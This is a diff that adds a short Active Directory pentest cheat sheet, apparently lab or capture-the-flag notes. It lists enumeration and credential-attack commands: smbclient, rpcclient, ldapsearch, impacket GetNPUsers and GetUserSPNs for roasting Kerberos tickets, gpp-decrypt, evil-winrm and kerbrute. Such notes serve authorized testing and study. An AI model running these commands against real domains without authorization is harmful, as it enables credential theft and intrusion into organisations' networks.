@@ -1,0 +1,37 @@
+# ACTIVE DIRECTORY METHODOLOGY
+## SMB Enum [port 445, 139]
+smbmap -H $ip
+smbclient -L //$IP/
+smbclient -L //$IP/share -c "recurse,ls"
+enum4linux -a $IP
+smbexec
+
+
+## RPC ENum [port 135]
+rpcclient -U '' -N $IP
+  enumdomusers
+  enumdomgroups
+  queryuser marko
+rpcdump.py
+rpcmap.py
+
+## LDAP ENUM [port 389]
+
+ldapsearch -H ldap://$IP -x -s base namingcontext
+ldapsearch -H ldap://$IP -x -b"DC=htb,DC=local" "(objectClass=User)" 'sAMAccountName' | grep sAMAccountName
+
+## NP USERS 
+impacket-GetNPUsers -dc-ip $IP -request 'htb.local/' -no-pass
+sudo ntpdate $IP
+impacket-GetUserSPNs -request -dc-ip $IP dc.htb/SVC_TGS:$password[cpassword]
+
+## WinRM [only when we have creds and Webserver Microsoft HTTPAPI]
+evil-winrm -i $IP -u $USERNAME
+
+
+## GPP Decryption [cpassword, kerberoasting]
+gpp-decrypt $password
+
+
+## KerbRute
+kerbrute userenum -d megabank.local /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt --dc $IP
